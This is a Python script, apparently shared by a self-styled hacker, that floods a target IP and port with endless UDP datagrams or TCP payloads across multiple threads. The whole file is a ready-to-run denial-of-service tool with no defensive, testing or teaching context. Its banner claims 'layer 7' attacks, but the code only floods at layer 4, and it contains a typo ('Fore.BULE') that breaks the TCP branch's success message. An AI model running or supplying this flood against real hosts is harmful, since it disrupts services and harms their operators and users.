
#Code by LeeOn123
import argparse
import random
import socket
import threading
from colorama import Fore, init
init()
print(Fore.MAGENTA+"""
==================
layer 7 + layer 4 
new!
==================

\n\n\n""")

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())
print("-->  By unknow hacker black <--")
print("#-- TCP/UDP FLOOD --#")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(Fore.BLUE+"Attack v2>;)!")
		except:
			print(Fore.RED+"erorr :(!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(Fore.BULE+" Attack >:)")
		except:
			s.close()
			print(Fore.RED+"error :(")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
